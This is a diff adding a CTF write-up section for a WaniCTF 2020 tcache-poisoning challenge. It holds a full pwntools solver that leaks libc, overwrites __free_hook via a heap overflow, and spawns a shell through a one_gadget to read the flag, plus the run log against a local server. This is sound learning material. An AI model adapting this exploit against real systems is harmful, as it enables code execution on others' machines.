@@ -601,3 +601,165 @@ io.close()
  (snip)
 ```
 
+## 08-tcache-poisoning
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/08-tcache-poisoning
+- https://hackmd.io/@theoldmoon0602/rJf0IS9mB
+
+```zsh
+$ docker compose up -d
+```
+
+```zsh
+$ docker exec -it heap-beginner ldd chall
+        linux-vdso.so.1 (0x00007ffce613e000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd49927c000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fd49966d000)
+```
+
+```zsh
+$ docker exec -it heap-beginner ls -l /lib/x86_64-linux-gnu/libc.so.6
+lrwxrwxrwx 1 root root 12 May  3  2022 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.27.so
+```
+
+```zsh
+$ ln -s file/libc-2.27.so libc.so.6
+```
+
+```zsh
+$ docker exec -it heap-beginner ls -l /lib64/ld-linux-x86-64.so.2
+lrwxrwxrwx 1 root root 32 May  3  2022 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.27.so
+```
+
+```zsh
+$ docker cp heap-beginner:/lib/x86_64-linux-gnu/ld-2.27.so .
+```
+
+### solver.py
+
+```python
+#!/usr/bin/env python3
+from pwn import ELF, args, context, flat, log, process, remote
+from pwnlib import gdb
+
+if args.DEBUG:
+    context.log_level = "debug"
+exe = context.binary = ELF("file/pwn08", checksec=False)
+libc = ELF("file/libc-2.27.so", checksec=False)
+ld_path = "./ld-2.27.so"
+env = {"LD_LIBRARY_PATH": "."}
+if args.GDB:
+    io = gdb.debug([ld_path, exe.path], env=env, gdbscript="c")
+elif args.REMOTE:
+    io = remote("::1", 9008)
+else:
+    io = process([ld_path, exe.path], env=env)
+
+
+def add_memo(index: int, size: int):
+    io.sendline(b"1")
+    log.info("add_memo(%d, 0x%x)", index, size)
+    io.sendlineafter(b": ", f"{index}".encode())
+    io.sendlineafter(b": ", f"{size}".encode())
+    io.recvuntil(b"command?: ")
+
+
+def edit_memo(index: int, data: bytes):
+    io.sendline(b"2")
+    log.info("edit_memo(%d, %s)", index, data)
+    io.sendlineafter(b": ", f"{index}".encode())
+    io.sendlineafter(b": ", data)
+    io.recvuntil(b"command?: ")
+
+
+def view_memo(index: int) -> bytes:
+    io.sendline(b"3")
+    log.info("view_memo(%d)", index)
+    io.sendlineafter(b": ", f"{index}".encode())
+    data = io.recvuntil(b"[[[", drop=True)
+    io.recvuntil(b"command?: ")
+    return data
+
+
+def del_memo(index: int):
+    io.sendline(b"9")
+    log.info("del_memo(%d)", index)
+    io.sendlineafter(b": ", f"{index}".encode())
+    io.recvuntil(b"command?: ")
+
+
+io.recvuntil(b"command?: ")
+# ------------------------------------------------------------------------
+add_memo(0, 0x418)
+add_memo(1, 0x18)
+add_memo(2, 0x18)
+add_memo(3, 0x18)
+# edit_memo(3, b"/bin/sh\x00")
+edit_memo(3, b"/bin/sh\x00")
+del_memo(0)
+add_memo(0, 0x418)
+leaked_addr = int.from_bytes(view_memo(0).split(b"\n")[0], "little")
+# pwndbg> vmmap libc
+# LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+#                Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+#             0x602000           0x603000 rw-p     1000    2000 file/pwn08
+# ►     0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000       0 file/libc-2.27.so
+#
+# p/x 0x00007ffff7dcdca0 - 0x7ffff79e2000
+# $2 = 0x3ebca0
+ofs = 0x3ebca0
+libc.address = leaked_addr - ofs
+log.info("libc.address: 0x%016x", libc.address)
+# ------------------------------------------------------------------------
+del_memo(2)
+log.info("__free_hook(): 0x%016x", libc.sym.__free_hook)
+edit_memo(1, flat(b"2"*0x18, 0x21, libc.sym.__free_hook))  # Heap BOF
+add_memo(9, 0x18)
+add_memo(2, 0x18)
+# one_gadget file/libc-2.27.so
+# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   rsp & 0xf == 0
+#   rcx == NULL
+#
+# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   [rsp+0x40] == NULL
+#
+# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+edit_memo(2, flat(libc.address + 0x4f432))
+io.timeout = 1
+del_memo(3)
+# ------------------------------------------------------------------------
+# io.interactive()
+io.sendline(b"cat flag.txt")
+io.recvuntil(b"FLAG{")
+log.success("FLAG{%s", io.recvuntil(b"}").decode())
+io.close()
+```
+
+### Answer
+
+```zsh
+$ ./solver.py REMOTE
+[+] Opening connection to ::1 on port 9008: Done
+[*] add_memo(0, 0x418)
+[*] add_memo(1, 0x18)
+[*] add_memo(2, 0x18)
+[*] add_memo(3, 0x18)
+[*] edit_memo(3, b'/bin/sh\x00')
+[*] del_memo(0)
+[*] add_memo(0, 0x418)
+[*] view_memo(0)
+[*] libc.address: 0x00007fb6c123e000
+[*] del_memo(2)
+[*] __free_hook(): 0x00007fb6c162b8e8
+[*] edit_memo(1, b'222222222222222222222222!\x00\x00\x00\x00\x00\x00\x00\xe8\xb8b\xc1\xb6\x7f\x00\x00')
+[*] add_memo(9, 0x18)
+[*] add_memo(2, 0x18)
+[*] edit_memo(2, b'2\xd4(\xc1\xb6\x7f\x00\x00')
+[*] del_memo(3)
+ (snip)
+```
